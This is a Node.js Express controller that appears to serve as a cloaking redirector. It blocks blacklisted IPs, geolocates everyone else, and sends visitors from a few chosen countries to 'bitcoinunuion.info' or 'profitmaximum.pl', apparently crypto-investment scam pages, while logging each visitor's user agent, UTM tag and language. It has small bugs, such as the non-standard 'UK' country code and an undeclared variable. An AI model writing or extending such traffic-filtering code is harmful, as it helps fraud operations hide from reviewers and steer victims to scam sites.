const geoip = require('geoip-lite');
const Ip = require('../models/IpAddress');
const User = require('../models/User');
const errorHandler = require('../utils/errorHandler');

module.exports.getUrl = async function (req, res) {
    try {
        const blackIp = await Ip.findOne({ip: req.ip})
        if (blackIp) {
            await saveUser('Your ip is blacklisted!', null, req).save()
            res.status(200).json(false)
        } else {
            let ip = req.ip
            if (ip.substr(0, 7) === "::ffff:") {
          ip = ip.substr(7)
    }
            let url = checkCountry(ip)
            let reason = null
            if (url === null) reason = 'Invalid country'
            await saveUser(reason, url, req).save()
            res.status(200).json({status: true,
            url: url})
        }

    } catch (e) {
        errorHandler(res, e)
    }
}

function checkCountry(ip) {
    let geo = geoip.lookup(ip);
    if (geo === null) {
        url = null
    } else {
    switch (geo.country) {
        case "CN":
            return url = 'bitcoinunuion.info/'
        case "UK":
            return url = 'bitcoinunuion.info/'
        case "AU":
            return url = 'bitcoinunuion.info/'
        case "SG":
            return url = 'bitcoinunuion.info/'
        case "PL":
            return url = 'profitmaximum.pl/'
        default:
            return url = null;
    }
    }
    return url
}

function saveUser(reason, url, req) {
    const user = new User({
        UserAgent: req.body.UserAgent,
        UTM: req.body.UTM,
        reason: reason,
        language: req.body.language,
        url: url
    });

    return user
}